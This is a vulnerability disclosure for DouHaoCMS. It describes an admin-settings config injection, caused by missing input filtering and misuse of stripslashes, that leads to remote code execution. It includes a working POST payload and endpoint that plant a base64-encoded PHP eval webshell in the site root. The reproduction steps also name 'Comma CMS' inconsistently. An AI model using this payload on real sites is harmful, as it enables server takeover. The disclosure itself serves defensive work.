DouHaoCMS is a lightweight, open-source content management system (CMS) developed using PHP and MySQL. Built on the ThinkPHP framework, it is primarily used for the rapid development of corporate websites, personal blogs, and small to medium-sized information display websites. The system's design emphasizes code structure simplicity and ease of deployment, providing users with core functional modules such as article and product management, and system configuration.

Discoverer:Jiayang Zhou

Code auditing revealed that lines 86-94 of `/app/Lib/Action/admin/SettingAction.class.php` contain code where the controller receives user-submitted system configuration parameters. The code only uses the `trim` function to remove leading and trailing spaces and does not perform any security filtering (such as for single quotes or HTML entities). Malicious data is directly packaged into the `$new_config` array and passed to the parent class method.

![img](C:\Users\酸菜鱼\Desktop\CVE\douhaocms\assets\wps1-1769824628337-23.jpg) 
![Vulnerability Screenshot](https://raw.githubusercontent.com/kklzzcun/CMS/main/DouHaoCMS/assets/DouHao1.png)
 

Furthermore, lines 284-295 of `/app/Lib/Action/BackendAction.class.php` incorrectly use `stripslashes` to process the output. `stripslashes` removes the backslashes (`\`) added by `var_export` for security purposes, leading to single-quote escaping issues.

![img](C:\Users\酸菜鱼\Desktop\CVE\douhaocms\assets\wps2-1769824628337-22.jpg)

Vulnerability reproduction


payload:  

setting[site_name]=Test&cache_time=123&cache_mode=file', 'x' => file_put_contents('shell.php', base64_decode('PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B')), 'junk' => '

Log in to the Comma CMS admin panel.
Send a POST request containing the above payload to the backend at /index.php?g=admin&m=setting&a=edit.

The payload was written to /data/config/config.php/config.php![img](C:\Users\酸菜鱼\Desktop\CVE\douhaocms\assets\wps3-1769824628337-26.jpg) 

![img](C:\Users\酸菜鱼\Desktop\CVE\douhaocms\assets\wps4-1769824628337-24.jpg) 

 

Refreshing any page in the backend will load config.php in the CMS, execute file_put_contents, and generate shell.php in the root directory.

![img](C:\Users\酸菜鱼\Desktop\CVE\douhaocms\assets\wps5-1769824628337-27.jpg) 

![img](C:\Users\酸菜鱼\Desktop\CVE\douhaocms\assets\wps6-1769824628337-25.jpg) 

![img](C:\Users\酸菜鱼\Desktop\CVE\douhaocms\assets\wps7-1769824628337-28.jpg) 

 







